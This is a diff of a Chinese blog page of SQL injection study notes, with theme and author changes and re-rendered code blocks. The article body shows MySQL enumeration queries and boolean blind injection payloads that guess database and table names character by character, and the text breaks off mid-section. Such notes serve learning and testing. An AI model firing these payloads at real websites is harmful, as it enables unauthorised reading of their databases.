@@ -1,162 +1,20 @@
-<!DOCTYPE html>
-<html lang=zh>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="SQL注入学习">
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="jjjing"/><meta name="copyright" content="jjjing"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="Hexo Theme MEOW"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="SQL注入 | jjjing"/><meta name="apple-mobile-web-app-title" content="SQL注入 | jjjing"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="https://jinggg1123.github.io/archives/2021/11/23/sql注入/"/><meta name="description" content="数据库结构Access：  表名 列名 数据      mysql、mssql、Oracle、MongoDB：  数据库名 表名 列名 数据        MYSQL注入查询方式select查询语句在网站应用中进行数据显示查询操作。 查库： 1SELECT schema_name FROM information_schema.schemata  查表： 1SELECT table_name...">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入">
-<meta property="og:url" content="https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/index.html">
-<meta property="og:site_name" content="before">
-<meta property="og:description" content="SQL注入学习">
+<meta property="og:title" content="SQL注入 | jjjing">
+<meta property="og:url" content="https://jinggg1123.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="jjjing">
+<meta property="og:description" content="数据库结构Access：  表名 列名 数据      mysql、mssql、Oracle、MongoDB：  数据库名 表名 列名 数据        MYSQL注入查询方式select查询语句在网站应用中进行数据显示查询操作。 查库： 1SELECT schema_name FROM information_schema.schemata  查表： 1SELECT table_name...">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jinggg1123.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/assets/images/Hexo-Theme-MEOW.png">
 <meta property="article:published_time" content="2021-11-23T11:20:33.000Z">
-<meta property="article:modified_time" content="2023-12-24T06:40:56.121Z">
-<meta property="article:author" content="before">
-<meta name="twitter:card" content="summary">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>SQL注入</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
-
-
-    <!-- Umami Analytics -->
-
-
-    <!-- styles -->
-    
+<meta property="article:modified_time" content="2024-12-08T13:23:39.438Z">
+<meta property="article:author" content="jjjing">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://jinggg1123.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>SQL注入 | jjjing</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
 <link rel="stylesheet" href="/css/style.css">
 
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<meta name="generator" content="Hexo 6.1.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a href="/categories/">分类</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="上一篇" href="/2021/11/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&text=SQL注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&is_video=false&description=SQL注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=SQL注入&body=Check out this article: https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&name=SQL注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&t=SQL注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">数据库结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">MYSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">查询方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.1.</span> <span class="toc-text">select查询语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.2.</span> <span class="toc-text">insert插入语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.3.</span> <span class="toc-text">delete删除语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.4.</span> <span class="toc-text">update更新数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">有回显注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.3.</span> <span class="toc-text">无回显盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.2.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.3.3.3.</span> <span class="toc-text">floor</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.4.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.5.</span> <span class="toc-text">dnslog注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.6.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.7.</span> <span class="toc-text">基本函数参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.8.</span> <span class="toc-text">注释符使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.9.</span> <span class="toc-text">异或注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.10.</span> <span class="toc-text">WAF绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">工具</span></a></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        SQL注入
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">before</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2021-11-23T11:20:33.000Z" class="dt-published" itemprop="datePublished">2021-11-23</time>
-        
-      
-    </div>
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
-    </div>
-
-
-      
-
-    </div>
-  </header>
-  
-
-  <div class="content e-content" itemprop="articleBody">
-    <h1><span id="数据库结构">数据库结构</span></h1><p>Access：</p>
+<link rel="stylesheet" href="/css/third-party/dist/APlayer.min.css">
+<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 6.3.0"></head><body bg-style="none"><div class="post-progressbar-container"><div class="post-progressbar"></div></div><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>jjjing</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"></div><div id="nav-function"><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="主页">jjjing</a></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">「 MEOW 」</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">SQL注入</h1><div class="post-author"><span>作者: jjjing</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2021-11-23</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2024-12-08</span></div></div><div class="post-read"></div></div><div class="post-attribute"><div class="post-categories"><img src="/assets/images/svg/ta/ta-category.svg" class="icon noview" alt="Icon"><span><a class="post-categories-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span></div></div></div><div class="post markdown" indent="false"><h1><span id="数据库结构">数据库结构</span></h1><p>Access：</p>
 <ul>
 <li>表名<ul>
 <li>列名<ul>
@@ -181,31 +39,31 @@
 </ul>
 <h1><span id="mysql注入">MYSQL注入</span></h1><h2><span id="查询方式">查询方式</span></h2><h3><span id="select查询语句">select查询语句</span></h3><p>在网站应用中进行数据显示查询操作。</p>
 <p><strong>查库</strong>：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT schema_name FROM information_schema.schemata<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT schema_name FROM information_schema.schemata</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>查表</strong>：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT table_name FROM information_schema.tables WHERE table_schema&#x3D;&#39;security&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>查列</strong>：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT column_name FROM information_schema.columns WHERE table_name&#x3D;&#39;users&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>查字段</strong>：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT username FROM security.users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM security.users</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h3><span id="insert插入语句">insert插入语句</span></h3><p>在网站应用中进行用户注册添加等操作。</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">INSERT INTO news(id,url,name) VALUES(2,&#39;x&#39;,&#39;abc&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO news(id,url,name) VALUES(2,&#x27;x&#x27;,&#x27;abc&#x27;);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h3><span id="delete删除语句">delete删除语句</span></h3><p>后台管理里面删除文章删除用户等操作。</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">DELETE FROM news WHERE id&#x3D;1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM news WHERE id=1;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h3><span id="update更新数据">update更新数据</span></h3><p>会员或后台中心数据同步或缓存等操作。</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">UPDATE user SET pwd&#x3D;123 WHERE id&#x3D;2 and username&#x3D;&#39;admin&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE user SET pwd=123 WHERE id=2 and username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
@@ -216,25 +74,22 @@
 <h2><span id="无回显盲注">无回显盲注</span></h2><h3><span id="布尔盲注">布尔盲注</span></h3><p>regexp、like、ascii、left、ord、mid</p>
 <p>一般配合py脚本注入。</p>
 <p>猜<strong>当前数据库名</strong>第一位字母：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and left(database(),1)&#x3D;&#39;s&#39;--+ 
-&#39;and substr(database(),1,1)&#x3D;&#39;s&#39;--+
-&#39;and ascii(substr(database(),1,1))&#x3D;115--+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Lisp"><div class="codebox"><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and left(<span class="name">database</span>(),<span class="number">1</span>)=&#x27;s&#x27;--+ </span><br><span class="line">&#x27;and substr(<span class="name">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=&#x27;s&#x27;--+</span><br><span class="line">&#x27;and ascii(<span class="name">substr</span>(<span class="name">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=115--+ </span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>猜<strong>第六个数据库名</strong>的第一个字母的ascii码：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and ascii(substr((select schema_name from information_schema.schemata limit 5,1),1,1))&#x3D;115--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Lisp"><div class="codebox"><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and ascii(<span class="name">substr</span>((<span class="name">select</span> schema_name from information_schema.schemata limit <span class="number">5</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=115--+</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>判断security库中的第四个表的数据的第一位的ascii码：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1,1))&gt;11--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
